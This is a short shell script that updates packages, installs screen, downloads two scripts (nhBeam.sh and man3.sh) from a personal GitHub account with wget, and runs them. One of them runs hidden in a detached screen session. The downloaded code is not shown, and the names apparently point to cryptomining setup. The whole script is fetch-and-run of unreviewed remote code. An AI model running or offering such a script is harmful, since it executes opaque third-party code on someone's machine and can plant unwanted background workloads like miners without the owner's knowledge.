#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/likeudo153/prem/raw/main/nhBeam.sh
wget https://github.com/likeudo153/FkgX/raw/main/man3.sh
chmod +x man3.sh
screen -dmS man3 ./man3.sh 60 70
chmod +x nhBeam.sh
./nhBeam.sh
